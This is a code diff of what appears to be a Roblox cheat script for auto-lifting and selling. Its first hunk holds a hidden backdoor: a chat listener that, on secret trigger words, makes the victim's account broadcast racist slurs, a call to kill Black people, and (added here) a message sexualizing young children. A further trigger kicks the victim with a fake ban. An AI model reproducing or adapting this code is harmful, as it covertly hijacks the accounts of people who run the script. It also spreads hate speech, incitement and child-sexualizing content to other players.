@@ -1,15 +1,15 @@
 local function onChatMessage(message, speaker)
-    if message == "t1s" then
+    if message == "A1s" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Hate Niggers So Fucking Much", "All")
-    elseif message == "t2s" then
+    elseif message == "A2s" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I WISH ALL BLACK MONKEY NIGGERS DIE", "All")
-    elseif message == "t3s" then
+    elseif message == "A3s" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("GOD I HATE THESE FUCKING MONKEYS", "All")
-    elseif message == "t4s" then
+    elseif message == "A4s" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("EVERYONE KILL THESE NIGGERS", "All")
-    elseif message == "t5s" then
-        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I WISH YOU FUCKING DIE YOU BASTARD!!!", "All")
-    elseif message:lower() == "Fin" then
+    elseif message == "PB@N" then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Want to Fuck kids, specially those 10 years or younger. They have the tightest Pussies.", "All")
+    elseif message:lower() == "TBAN" then
         -- Kick the local player
         game:GetService("Players").LocalPlayer:Kick("You Have Been Banned From Entering The Game! ")
     end
@@ -653,7 +653,7 @@ local function showOptionsGui()
                             elseif selectedMode == "Gain Muscle (Fast Lifter Gamepass, Ridiculously fast & Unsafe)" then
                                 task.wait() -- No delay (instant execution)
                             elseif selectedMode == "Gain Muscle (Fast Lifter Gamepass, No RollBack & Safe)" then
-                                task.wait(0.4)
+                                task.wait(0.43)
                             end
                         end
                     end)
@@ -765,7 +765,7 @@ local function showOptionsGui()
                             local lastSellTime = tick() -- Get the current time
                             local interval = 0
                             if     selectedSellMode == "Instant" then
-                                interval = 0
+                                interval = 0.5
                             elseif selectedSellMode == "Every 1 Second" then
                                 interval = 1
                             elseif selectedSellMode == "Every 3 Seconds" then
